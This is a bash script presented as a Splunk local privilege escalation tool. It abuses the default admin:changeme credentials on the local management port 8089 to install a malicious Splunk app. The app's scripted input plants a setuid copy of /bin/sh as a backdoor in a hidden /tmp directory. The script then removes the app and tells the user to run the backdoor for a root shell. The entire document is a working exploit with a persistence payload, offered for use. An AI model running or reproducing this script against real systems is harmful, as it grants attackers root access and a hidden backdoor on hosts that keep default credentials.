echo
echo "[!] SPLUNK LOCAL PRIVESC [!]"
echo "[!] This tool assumes the creds are admin:changeme"
echo "[!] and the port is 8089"
echo

echo "[*] Creating a tmp workspace and moving there..."
mkdir -p /tmp/.tester
cd /tmp/.tester

echo
echo "[*] Creating the splunk app..."
mkdir -p /tmp/.tester/APPY/bin
mkdir -p /tmp/.tester/APPY/local
echo "[script://./bin/pay.sh]" >> /tmp/.tester/APPY/local/inputs.conf
echo "disabled = false" >> /tmp/.tester/APPY/local/inputs.conf
echo "index = default" >> /tmp/.tester/APPY/local/inputs.conf
echo "interval = 10" >> /tmp/.tester/APPY/local/inputs.conf
echo "sourcetype = test" >> /tmp/.tester/APPY/local/inputs.conf

echo
echo "[*] Creating the payload..."
# THIS CREATES A SUID SHELL BACKDOOR
# EDIT THIS IF YOU WANT TO RUN A DIFFERENT PAYLOAD

echo "mkdir -p /tmp/.tester/bin" >> /tmp/.tester/APPY/bin/pay.sh
echo "chmod 611 /tmp/.tester/bin" >> /tmp/.tester/APPY/bin/pay.sh
echo "cp /bin/sh /tmp/.tester/bin/shdoor" >> /tmp/.tester/APPY/bin/pay.sh
echo "chmod 777 /tmp/.tester/bin/shdoor" >> /tmp/.tester/APPY/bin/pay.sh
echo "chmod u+s /tmp/.tester/bin/shdoor" >> /tmp/.tester/APPY/bin/pay.sh
chmod 777 /tmp/.tester/APPY/bin/pay.sh

echo
echo "Tarballing the App and removing temp files..."
tar cvf tmpAPP.tar ./APPY
chmod 777 tmpAPP.tar
rm -rf ./APPY

# NO ERROR CHECKING YET
echo "[*] App should be created..."
echo

echo
echo "[*] Installing the malicious splunk app...."
curl -i -s -k  -X $'POST' \
	     -H $'Host: 127.0.0.1:8089' -H $'Connection: close' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'User-Agent: python-requests/2.18.4' -H $'Content-Length: 60' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Authorization: Basic YWRtaW46Y2hhbmdlbWU=' \
	         --data-binary $'update=True&name=%2Ftmp%2F.tester%2FtmpAPP.tar&filename=True' \
		     $'https://127.0.0.1:8089/services/apps/local/'

echo 
echo 
echo
sleep 3
echo
echo
echo
echo "[*] Removing the malicious splunk app..."
curl -i -s -k  -X $'DELETE' \
	    -H $'Host: 127.0.0.1:8089' -H $'Connection: close' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'User-Agent: python-requests/2.18.4' -H $'Content-Length: 0' -H $'Authorization: Basic YWRtaW46Y2hhbmdlbWU=' \
	        $'https://127.0.0.1:8089/services/apps/local/APPY'

echo
echo
echo

echo "[!] If all went well run /tmp/.tester/bin/shdoor -p for a root shell"
echo "[!] Run whoami if your prompt didn't change..."
echo
echo "[!] DELETE THE .tester DIRECTORY AS ROOT WHEN YOU'RE DONE! [!]"
